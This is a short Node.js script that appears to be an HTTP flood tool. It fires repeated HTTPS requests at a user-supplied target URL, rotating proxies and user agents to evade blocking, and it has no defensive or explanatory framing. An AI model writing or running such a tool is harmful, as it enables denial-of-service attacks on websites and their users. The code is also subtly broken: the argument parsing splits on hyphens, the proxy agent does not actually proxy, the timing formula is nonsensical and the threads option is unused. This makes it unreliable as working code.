const https = require('https');
const fs = require('fs');
const url = require('url');

// Command-line arguments
const args = process.argv.slice(2);
const argMap = {};

for (let i = 0; i < args.length; i++) {
  const arg = args[i].split('-').filter(Boolean);
  if (arg.length === 2) {
    argMap[arg[0].trim()] = arg[1].trim();
  }
}

// Function to make HTTPS requests
function makeRequest(targetUrl, proxyListFile, userAgentListFile, threads, requests, duration) {
  const proxies = fs.readFileSync(proxyListFile, 'utf-8').split('\n').filter(Boolean);
  const userAgents = fs.readFileSync(userAgentListFile, 'utf-8').split('\n').filter(Boolean);

  const requestOptions = {
    method: 'GET',
    headers: {
      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    },
  };

  function sendRequest() {
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    const proxyParts = randomProxy.split(':');
    const proxyHostname = proxyParts[0];
    const proxyPort = parseInt(proxyParts[1], 10);

    requestOptions.agent = new https.Agent({ 
      host: proxyHostname, 
      port: proxyPort, 
      rejectUnauthorized: false 
    });

    const parsedUrl = url.parse(targetUrl);
    requestOptions.hostname = parsedUrl.hostname;
    requestOptions.port = parsedUrl.port || 443;
    requestOptions.path = parsedUrl.path;

    const req = https.request(requestOptions, (res) => {
      res.setEncoding('utf8');
      res.on('data', (data) => {
        console.log(data);
      });
    });

    req.end();
    req.on('error', (error) => {
      console.error(error);
    });
  }

  const interval = setInterval(() => {
    if (requests <= 0) {
      clearInterval(interval);
      console.log('Done.');
    } else {
      sendRequest();
      requests--;
    }
  }, duration * 99999999 / requests);
}

// Main program
const targetUrl = argMap['target'] || '';
const proxyListFile = argMap['proxy'] || '';
const userAgentListFile = argMap['ua'] || '';
const threads = parseInt(argMap['threads']) || 1;
const requests = parseInt(argMap['request']) || 1;
const duration = parseInt(argMap['time']) || 60;

if (!targetUrl || !proxyListFile || !userAgentListFile) {
  console.error('Missing or invalid arguments. Usage:');
  console.error('node Tls.js -target <URL> -proxy <proxy_file> -ua <user_agent_file> -threads <threads> -request <requests> -time <duration_in_seconds>');
} else {
  makeRequest(targetUrl, proxyListFile, userAgentListFile, threads, requests, duration);
}
